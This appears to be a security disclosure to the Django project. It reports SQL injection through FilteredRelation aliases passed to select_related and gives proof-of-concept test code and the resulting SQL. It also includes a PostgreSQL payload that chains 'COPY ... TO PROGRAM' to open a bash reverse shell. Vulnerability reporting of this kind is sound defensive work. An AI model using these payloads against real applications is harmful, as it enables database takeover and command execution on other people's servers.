Hi Hackers :)

Vulnerability location:
https://github.com/django/django/blob/main/tests/filtered_relation/tests.py#L124

You may create my POC function above the "test_select_related_foreign_key" function:
```
    def test_select_related_foreign_key_sqli(self):
        user_data = "author_join2\""

        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation("author"),
        })
            .select_related(user_data)
        )

        qs._fetch_all()
```

SQL Query:
`SELECT "filtered_relation_book"."id", "filtered_relation_book"."title", "filtered_relation_book"."author_id", "filtered_relation_book"."editor_id", "filtered_relation_book"."number_editor", "filtered_relation_book"."editor_number", "filtered_relation_book"."state", author_join2"."id", author_join2"."name", author_join2"."content_type_id", author_join2"."object_id" FROM "filtered_relation_book" INNER JOIN "filtered_relation_author" author_join2" ON ("filtered_relation_book"."author_id" = author_join2"."id")`

<img width="1106" height="253" alt="image" src="https://github.com/user-attachments/assets/1e0c6d2b-f14f-4ac3-ac23-9b287619b4ab" />

To execute the SQLI  you may run:
`python3 django/tests/runtests.py filtered_relation.tests.FilteredRelationTests.test_select_related_foreign_key_sqli`

## Impact

The impact is direct SQL Injection for any user with access to `select_related(` as above.


The SQLI occurs in multiple databases (not only on sqlite).

As an attacker I am able to run os commands using the SQLI.

__1 example would be in postgresql:__

An attacker may use the COPY command with the PROGRAM attribute as such:

```
    def test_select_related_foreign_key_sqli(self):
        user_data = 'author_join."id", author_join."name", author_join."content_type_id", author_join."object_id" FROM "filtered_relation_book" INNER JOIN "filtered_relation_author" author_join ON ("filtered_relation_book"."author_id" = author_join."id") ; COPY (SELECT \'\') TO PROGRAM \'bash -i >& /dev/tcp/127.0.0.1/1025 0>&1\'; -- '

        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation("author"),
        })
            .select_related(user_data)
        )

        qs._fetch_all()

```
After the SQLI:

<img width="746" height="744" alt="image" src="https://github.com/user-attachments/assets/a478f61e-c5a8-4e48-ad27-6fd44aab0ab7" />

